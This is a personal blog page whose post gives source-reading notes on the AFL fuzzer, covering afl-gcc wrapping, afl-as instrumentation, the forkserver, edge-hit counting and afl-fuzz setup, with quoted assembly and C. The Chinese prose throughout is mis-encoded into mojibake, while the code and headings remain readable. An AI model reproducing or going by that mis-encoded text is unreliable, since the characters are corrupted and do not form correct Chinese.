<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"fxc233.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="fxc233&#39;s blog">
<meta property="og:url" content="https://fxc233.github.io/index.html">
<meta property="og:site_name" content="fxc233&#39;s blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="fxc233">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://fxc233.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>fxc233's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">fxc233's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/fxc233" class="github-corner" title="fxc233 GitHub" aria-label="fxc233 GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fxc233.github.io/2023/12/15/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%B0%8F%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="fxc233">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fxc233's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/15/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%B0%8F%E8%AE%B0/" class="post-title-link" itemprop="url">AFLæºç é˜…è¯»å°è®°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-12-15 12:26:27 / Modified: 12:44:05" itemprop="dateCreated datePublished" datetime="2023-12-15T12:26:27+08:00">2023-12-15</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="afl-gcc"><a href="#afl-gcc" class="headerlink" title="afl-gcc"></a>afl-gcc</h1><h2 id="find-as"><a href="#find-as" class="headerlink" title="find-as"></a>find-as</h2><p>ç”¨æ¥å¯»æ‰¾<strong>as</strong>çš„è·¯å¾„ã€‚åˆ†åˆ«ä»ç¯å¢ƒå˜é‡<strong>AFL_PATH</strong>ï¼Œ<strong>afl-gccçš„è·¯å¾„ï¼ˆå¦‚æœæ˜¯ç»å¯¹è·¯å¾„æˆ–ç›¸å¯¹è·¯å¾„è°ƒç”¨afl-gccï¼‰</strong>ï¼Œ&#x2F;usr&#x2F;local&#x2F;lib&#x2F;aflä¸‰ä¸ªåœ°æ–¹å¯»æ‰¾ã€‚å¦‚æœæ‰¾ä¸åˆ°åˆ™æŠ¥å‡ºç›¸åº”é”™è¯¯ã€‚ä¸‹åˆ—æ˜¯æˆ‘è°ƒè¯•æ—¶æ‰“å°å‡ºæ¥çš„å‚æ•°ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc: find_as</span><br><span class="line">argv0: afl-gcc</span><br><span class="line">AFL_PATH: /usr/local/lib/afl</span><br></pre></td></tr></table></figure>

<h2 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h2><p>ç”¨æ¥å¯¹åŸç”Ÿ<strong>gcc</strong>è¿›è¡Œä¸€ä¸ªå°è£…ï¼ŒåŠ ä¸Šäº†ä¸€äº›å‚æ•°å¹¶å­˜æ”¾åˆ°<strong>cc_params</strong>ä¸­ã€‚å¦‚ç¬”è€…ä½¿ç”¨<strong>afl-gcc -o test test.c</strong>å¯¹æ–‡ä»¶è¿›è¡Œç¼–è¯‘ï¼Œåˆ™ä¼šè¢«å°è£…æˆå¦‚ä¸‹ä»£ç ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gcc</span><br><span class="line">-o</span><br><span class="line">test</span><br><span class="line">test.c</span><br><span class="line">-B</span><br><span class="line">/usr/local/lib/afl</span><br><span class="line">-g</span><br><span class="line">-O3</span><br><span class="line">-funroll-loops</span><br><span class="line">-D__AFL_COMPILER=1</span><br><span class="line">-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</span><br></pre></td></tr></table></figure>

<h1 id="afl-as"><a href="#afl-as" class="headerlink" title="afl-as"></a>afl-as</h1><h2 id="edit-params-1"><a href="#edit-params-1" class="headerlink" title="edit_params"></a>edit_params</h2><p>å¯¹åŸç”Ÿ<strong>as</strong>è¿›è¡Œå°è£…ï¼Œå‚æ•°å­˜æ”¾åˆ°<strong>as_params</strong>ä¸­ã€‚åŒæ—¶é€šè¿‡ä¼ å…¥çš„å‚æ•°è®¾ç½®ä¸€äº›å˜é‡çš„å€¼ï¼Œå¹¶ä¸”å®šä¹‰å¥½<strong>modified_file</strong>ã€‚åŸæœ¬ä¼ å…¥çš„å‘½ä»¤å’Œç»è¿‡ä¿®æ”¹çš„å‘½ä»¤å¦‚ä¸‹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">argv                          as_params</span><br><span class="line">/usr/local/lib/afl/as         as</span><br><span class="line">--64                          --64</span><br><span class="line">-o                            -o</span><br><span class="line">/tmp/cc6ribB2.o               /tmp/cc6ribB2.o</span><br><span class="line">/tmp/ccBeRi60.s               /tmp/.afl-165297-1701960501.s</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆä¸»å‡½æ•°ä¸­ä¹Ÿä¼šè¿è¡Œè¿™ä¸ªå‘½ä»¤ã€‚</p>
<h2 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h2><p>å°è¯•æŠŠ<strong>input_file</strong>ä¸­çš„å†…å®¹ï¼Œè¿›è¡Œæ’æ¡©å¹¶æ”¾åˆ°<strong>modified_file</strong>ä¸­ã€‚æ‰“å¼€æ–‡ä»¶åæ»¡è¶³ä»¥ä¸‹è§„åˆ™è¿›è¡Œæ’æ¡©ã€‚</p>
<ul>
<li>!pass_thruï¼Œä¸æ˜¯ç”¨æ¥ä¼ é€æ•°æ®</li>
<li>!skip_intelï¼Œä¸æ˜¯intelæ±‡ç¼–</li>
<li>!skip_appï¼Œä¸æ˜¯__asm__å†…è”æ±‡ç¼–</li>
<li>!skip_csectï¼Œä¸ä¸å½“å‰æ¶æ„ä¸é€‚é…ï¼ˆæ¯”å¦‚åœ¨x64æ¶æ„ä¸­é‡åˆ°x86æ±‡ç¼–ï¼‰</li>
<li>instr_okï¼Œåœ¨textæ®µä¸­</li>
<li>instrument_nextï¼Œæœ‰æ—¶ä¼šæŠŠinstrument_nextç½®é›¶ä½¿å¾—ä¸ä¼šè¿›è¡Œæ’æ¡©</li>
<li>line[0] &#x3D;&#x3D; â€˜\tâ€™ï¼Œæ­¤è¡Œå¼€å¤´è¦ä¸º<strong>\t</strong></li>
<li>isalpha(line[1])ï¼Œline[1]è¦æ˜¯å­—æ¯</li>
</ul>
<p>æˆ–è€…é‡åˆ°è·³è½¬æŒ‡ä»¤ä¸”ä¸æ˜¯<strong>jmp</strong>æ—¶ï¼Œä¹Ÿä¼šæ’æ¡©ã€‚</p>
<p>æœ€åå¦‚æœå­˜åœ¨æ»¡è¶³ä¸Šè¿°æ¡ä»¶çš„åœ°æ–¹ï¼Œå¹¶è¿›è¡Œäº†æ’æ¡©ï¼Œåœ¨æœ€ååˆ™ä¼šæ ¹æ®æ¶æ„æ’å…¥<strong>main_payload_64æˆ–main_payload_32</strong>ã€‚</p>
<p>æ€»çš„æ¥è¯´å°±æ˜¯é‡åˆ°å¦‚ä¸‹æ±‡ç¼–æ—¶è¿›è¡Œæ’æ¡©ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function:   â€”â€”  å‡½æ•°å…¥å£</span><br><span class="line">.L0         â€”â€”  GCCåˆ†æ”¯è·³è½¬æ ‡ç­¾</span><br><span class="line">.jnz fun    â€”â€”  æ¡ä»¶è·³è½¬</span><br></pre></td></tr></table></figure>

<h2 id="trampoline"><a href="#trampoline" class="headerlink" title="trampoline"></a>trampoline</h2><p>æ¯”å¦‚x64ç¨‹åºä¸­æ’å…¥çš„ä»£ç å¦‚ä¸‹ï¼Œä¼šè°ƒç”¨__afl_maybe_logï¼Œä¸”<strong>rcx</strong>çš„å€¼æ˜¯ä¸€ä¸ªä¸è¶…è¿‡<strong>1&lt;&lt;16</strong>çš„éšæœºæ•°ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span><br><span class="line">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span><br><span class="line">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span><br><span class="line">&quot;movq %%rax, 16(%%rsp)\n&quot;</span><br><span class="line">&quot;movq $0x%08x, %%rcx\n&quot;</span><br><span class="line">&quot;call __afl_maybe_log\n&quot;</span><br><span class="line">&quot;movq 16(%%rsp), %%rax\n&quot;</span><br><span class="line">&quot;movq  8(%%rsp), %%rcx\n&quot;</span><br><span class="line">&quot;movq  0(%%rsp), %%rdx\n&quot;</span><br><span class="line">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span><br></pre></td></tr></table></figure>

<h3 id="afl-maybe-log"><a href="#afl-maybe-log" class="headerlink" title="__afl_maybe_log"></a>__afl_maybe_log</h3><p>æ£€æŸ¥å…±äº«å†…å­˜(__afl_area_ptr)æ˜¯å¦å·²ç»è¢«è®¾ç½®ï¼Œå¦‚æœæ²¡è¢«è®¾ç½®å°±è°ƒç”¨__afl_setupè¿›è¡Œåˆå§‹åŒ–ï¼Œè®¾ç½®è¿‡å°±è°ƒç”¨__afl_storeã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;  movq  __afl_area_ptr(%rip), %rdx\n&quot;</span><br><span class="line">&quot;  testq %rdx, %rdx\n&quot;</span><br><span class="line">&quot;  je    __afl_setup\n&quot;</span><br><span class="line">&quot;\n&quot;</span><br><span class="line">&quot;__afl_store:\n&quot;</span><br></pre></td></tr></table></figure>

<h3 id="afl-setup"><a href="#afl-setup" class="headerlink" title="__afl_setup"></a>__afl_setup</h3><p>ä¼šæ£€æŸ¥__afl_setup_failureæ˜¯å¦ä¸º0ï¼Œä¹Ÿå³æ£€æŸ¥ä¹‹å‰__afl_setupæ˜¯å¦è°ƒç”¨å¤±è´¥ï¼Œå¦‚æœä¹‹å‰å¤±è´¥åˆ™è·³è½¬åˆ°__afl_returnè¿”å›ã€‚å¦åˆ™å†æ£€æŸ¥__afl_global_area_ptræ˜¯å¦ä¸º0ï¼Œä¸º0åˆ™è·³è½¬åˆ°__afl_setup_firstè¿›è¡Œåˆå§‹åŒ–ï¼Œå¦åˆ™æŠŠ__afl_global_area_ptrèµ‹å€¼ç»™__afl_area_ptråï¼Œè·³è½¬åˆ°__afl_storeã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;  cmpb $0, __afl_setup_failure(%rip)\n&quot;</span><br><span class="line">&quot;  jne __afl_return\n&quot;</span><br><span class="line">&quot;  movq  __afl_global_area_ptr(%rip), %rdx\n&quot;</span><br><span class="line">&quot;  testq %rdx, %rdx\n&quot;</span><br><span class="line">&quot;  je    __afl_setup_first\n&quot;</span><br><span class="line">&quot;  movq %rdx, __afl_area_ptr(%rip)\n&quot;</span><br><span class="line">&quot;  jmp  __afl_store\n&quot; </span><br></pre></td></tr></table></figure>

<h3 id="afl-setup-first"><a href="#afl-setup-first" class="headerlink" title="__afl_setup_first"></a>__afl_setup_first</h3><p>ç”¨æ¥ä¿å­˜å¯„å­˜å™¨å¹¶ä¿è¯æ ˆå¯¹é½ã€‚ä¹‹åè°ƒç”¨<strong>shmat</strong>è·å–å…±äº«å†…å­˜åœ°å€å­˜æ”¾åˆ°å…¨å±€å˜é‡__afl_area_ptråŠ__afl_global_area_pträ¸­ã€‚æ‰§è¡Œå®Œæ¯•è°ƒç”¨__afl_forkserverã€‚</p>
<h3 id="afl-forkserver"><a href="#afl-forkserver" class="headerlink" title="__afl_forkserver"></a>__afl_forkserver</h3><p>å‘ç®¡é“ä¸­å†™å…¥<strong>4å­—èŠ‚</strong>ï¼Œæ¥é€šçŸ¥<strong>fuzz</strong>æˆ‘ä»¬<strong>fork-server</strong>å·²ç»å‡†å¤‡å¥½ã€‚å†™å…¥å¤±è´¥åˆ™ä¼šè°ƒç”¨__afl_fork_resumeã€‚æˆåŠŸåˆ™è°ƒç”¨__afl_fork_wait_loopã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot;  pushq %rdx\n&quot;</span><br><span class="line">&quot;  pushq %rdx\n&quot;</span><br><span class="line">&quot;  movq $4, %rdx               /* length    */\n&quot;</span><br><span class="line">&quot;  leaq __afl_temp(%rip), %rsi /* data      */\n&quot;</span><br><span class="line">&quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi       /* file desc */\n&quot;</span><br><span class="line">CALL_L64(&quot;write&quot;)</span><br><span class="line">&quot;  cmpq $4, %rax\n&quot;</span><br><span class="line">&quot;  jne  __afl_fork_resume\n&quot;</span><br><span class="line">&quot;\n&quot;</span><br><span class="line">&quot;__afl_fork_wait_loop:\n&quot;</span><br></pre></td></tr></table></figure>

<h3 id="afl-fork-wait-loop"><a href="#afl-fork-wait-loop" class="headerlink" title="__afl_fork_wait_loop"></a>__afl_fork_wait_loop</h3><p>ç­‰å¾…çˆ¶è¿›ç¨‹ä»ç®¡é“å‘é€æ¥çš„å‘½ä»¤ï¼Œå¹¶å­˜æ”¾åˆ°__afl_tempä¸­ã€‚è¯»å–å¤±è´¥åˆ™è°ƒç”¨__afl_dieï¼ŒæˆåŠŸåˆ™è°ƒç”¨<strong>fork</strong>ã€‚å­è¿›ç¨‹ä¸­è°ƒç”¨__afl_fork_resumeï¼Œå½“å‰è¿›ç¨‹æŠŠå­è¿›ç¨‹å·è®°å½•åˆ°__afl_fork_pidåï¼Œå†å†™å…¥ç®¡é“ï¼Œå¹¶ä¸”ç­‰å¾…å­è¿›ç¨‹è¿”å›ã€‚ç­‰å¾…å­è¿›ç¨‹æ‰§è¡Œå®Œæ¯•ï¼ŒæŠŠå­è¿›ç¨‹çŠ¶æ€å†™å…¥ç®¡é“å‘ŠçŸ¥<strong>fuzz</strong>ã€‚å†é‡æ–°è°ƒç”¨__afl_fork_wait_loopè¿›è¡Œä¸‹ä¸€è½®æµ‹è¯•ã€‚</p>
<h3 id="afl-fork-resume"><a href="#afl-fork-resume" class="headerlink" title="__afl_fork_resume"></a>__afl_fork_resume</h3><p>å…³é—­ç®¡é“æè¿°ç¬¦ï¼Œæ¢å¤å¯„å­˜å™¨çš„å€¼ã€‚è°ƒç”¨__afl_storeã€‚</p>
<h3 id="afl-die"><a href="#afl-die" class="headerlink" title="__afl_die"></a>__afl_die</h3><p>è°ƒç”¨<strong>_exit</strong>ã€‚</p>
<h3 id="afl-store"><a href="#afl-store" class="headerlink" title="__afl_store"></a>__afl_store</h3><p>ç”¨æ¥è®¡ç®—è¾¹çš„å‘½ä¸­æ¬¡æ•°ï¼Œ<strong>RCX</strong>å³å½“å‰è¾¹çš„idã€‚é¦–å…ˆè®¡ç®—rcxå’Œæ›´æ–°__afl_prev_loc ã€‚</p>
<ul>
<li>rcx &#x3D; rcx ^ __afl_prev_loc</li>
<li>__afl_prev_loc &#x3D; __afl_prev_loc ^ rcx</li>
<li>__afl_prev_loc &#x3D; __afl_prev_loc &gt;&gt; 1</li>
</ul>
<p>ä¹‹åæŠŠ__afl_area_ptr[rcx]+1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#ifndef COVERAGE_ONLY</span><br><span class="line">  &quot;  xorq __afl_prev_loc(%rip), %rcx\n&quot;</span><br><span class="line">  &quot;  xorq %rcx, __afl_prev_loc(%rip)\n&quot;</span><br><span class="line">  &quot;  shrq $1, __afl_prev_loc(%rip)\n&quot;</span><br><span class="line">#endif /* ^!COVERAGE_ONLY */</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">#ifdef SKIP_COUNTS</span><br><span class="line">  &quot;  orb  $1, (%rdx, %rcx, 1)\n&quot;</span><br><span class="line">#else</span><br><span class="line">  &quot;  incb (%rdx, %rcx, 1)\n&quot;</span><br><span class="line">#endif /* ^SKIP_COUNTS */</span><br></pre></td></tr></table></figure>

<h1 id="afl-fuzz"><a href="#afl-fuzz" class="headerlink" title="afl-fuzz"></a>afl-fuzz</h1><h2 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h2><p>æ³¨å†Œå¿…è¦çš„ä¿¡å·å¤„ç†å‡½æ•°</p>
<h2 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts"></a>check_asan_opts</h2><p>è¯»å–ç¯å¢ƒå˜é‡<strong>ASAN_OPTIONS</strong>å’Œ<strong>MSAN_OPTIONS</strong>å¹¶è¿›è¡Œæ£€æŸ¥ã€‚</p>
<h2 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync"></a>fix_up_sync</h2><p>å¦‚æœå­˜åœ¨-Mæˆ–-Sï¼Œæ›´æ”¹out_dirå’Œsync_idã€‚</p>
<h2 id="save-cmdline"><a href="#save-cmdline" class="headerlink" title="save_cmdline"></a>save_cmdline</h2><p>ä¿å­˜å‘½ä»¤è¡Œå‚æ•°åˆ°å…¨å±€å˜é‡<strong>orig_cmdline</strong>ä¸­ã€‚</p>
<h2 id="fix-up-banner"><a href="#fix-up-banner" class="headerlink" title="fix_up_banner"></a>fix_up_banner</h2><p>è·å–æµ‹è¯•æ–‡ä»¶å</p>
<h2 id="check-if-tty"><a href="#check-if-tty" class="headerlink" title="check_if_tty"></a>check_if_tty</h2><p>æ£€æŸ¥æ˜¯å¦åœ¨<strong>tty</strong>ä¸­è¿è¡Œï¼Œå¹¶è®°å½•åœ¨<strong>not_on_tty</strong>é‡Œã€‚</p>
<h2 id="get-core-count"><a href="#get-core-count" class="headerlink" title="get_core_count"></a>get_core_count</h2><p>è·å–cpuçš„æ ¸å¿ƒæ•°</p>
<h2 id="bind-to-free-cpu"><a href="#bind-to-free-cpu" class="headerlink" title="bind_to_free_cpu"></a>bind_to_free_cpu</h2><p>linuxç³»ç»Ÿï¼Œå¦‚æœå­˜åœ¨ç©ºé—²æ ¸å¿ƒï¼Œå°±ç»‘å®šåˆ°è¿™ä¸ªcpuä¸Š</p>
<h2 id="check-crash-handling"><a href="#check-crash-handling" class="headerlink" title="check_crash_handling"></a>check_crash_handling</h2><p>æ£€æŸ¥crashçš„å¤„ç†æ–¹å¼ï¼Œæ‰§è¡Œ<strong>echo core &gt;&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern</strong>ï¼Œä»¥é˜²å­˜åœ¨å»¶è¿Ÿã€‚</p>
<h2 id="setup-post"><a href="#setup-post" class="headerlink" title="setup_post"></a>setup_post</h2><p>å¦‚æœå­˜åœ¨ç¯å¢ƒå˜é‡<strong>AFL_POST_LIBRARY</strong>ï¼Œåˆ™ä¼šä»å…¶è®°å½•çš„åŠ¨æ€é“¾æ¥åº“ä¸­è·å–å‡½æ•°<strong>afl_postprocess</strong>ï¼Œå¹¶è®°å½•åˆ°å…¨å±€å‡½æ•°æŒ‡é’ˆ<strong>post_handler</strong>ä¸­ã€‚è¿™ä¸ªå‡½æ•°æŒ‡é’ˆä¼šè¢«<strong>common_fuzz_stuff</strong>è°ƒç”¨ï¼Œç”¨æ¥å¤„ç†<strong>out_buf</strong>ã€‚</p>
<h2 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup_shm"></a>setup_shm</h2><p>ç”¨æ¥åˆå§‹åŒ–å…±äº«å†…å­˜ï¼Œè®¾ç½®<strong>SHM_ENV_VAR</strong>ï¼Œå’Œåˆå§‹åŒ–<strong>virgin_bits</strong>ï¼Œ<strong>virgin_tmout</strong>ï¼Œ<strong>virgin_crash</strong>ã€‚</p>
<ul>
<li>å¦‚æœ<strong>in_bitmap</strong>ä¸ºç©ºï¼Œå°±åˆå§‹åŒ–<strong>virgin_bits</strong>ï¼Œ<strong>virgin_tmout</strong>ï¼Œ<strong>virgin_crash</strong>ä¸º<strong>\xff</strong>ã€‚</li>
<li>shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | 0600); åˆ†é…å…±äº«å†…å­˜ï¼Œå¹¶æŠŠidå­˜åˆ°<strong>shm_id</strong>é‡Œã€‚</li>
<li>atexit(remove_shm); æ³¨å†Œå¤„ç†å‡½æ•°åœ¨é€€å‡ºæ—¶åˆ é™¤å…±äº«å†…å­˜ã€‚ï¼ˆè¿™ä¸ªatexitä¹Ÿå°±æ˜¯ctfé‡Œæ‰€è°“çš„â€œexit-hookâ€çš„ä¸€ç§ã€‚ğŸ˜€</li>
<li>setenv(SHM_ENV_VAR, shm_str, 1); å¦‚æœä¸æ˜¯<strong>dumb_mode</strong>ï¼Œè®¾ç½®<strong>SHM_ENV_VAR</strong>ä¸º<strong>shm_str</strong>ã€‚</li>
<li>trace_bits &#x3D; shmat(shm_id, NULL, 0); å¯åŠ¨å¯¹å…±äº«å†…å­˜çš„è®¿é—®ã€‚</li>
</ul>
<h2 id="init-count-class16"><a href="#init-count-class16" class="headerlink" title="init_count_class16"></a>init_count_class16</h2><p>åˆå§‹åŒ–<strong>count_class_lookup16</strong>ï¼Œç›®çš„æ˜¯æé«˜<strong>count_class_lookup8</strong>çš„æ•ˆç‡ã€‚å…ˆçœ‹ä¸€ä¸‹<strong>count_class_lookup8</strong>å®šä¹‰ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> u8 count_class_lookup8[<span class="number">256</span>] = &#123;</span><br><span class="line"></span><br><span class="line">  [<span class="number">0</span>]           = <span class="number">0</span>,</span><br><span class="line">  [<span class="number">1</span>]           = <span class="number">1</span>,</span><br><span class="line">  [<span class="number">2</span>]           = <span class="number">2</span>,</span><br><span class="line">  [<span class="number">3</span>]           = <span class="number">4</span>,</span><br><span class="line">  [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">8</span>,</span><br><span class="line">  [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">16</span>,</span><br><span class="line">  [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">32</span>,</span><br><span class="line">  [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">64</span>,</span><br><span class="line">  [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

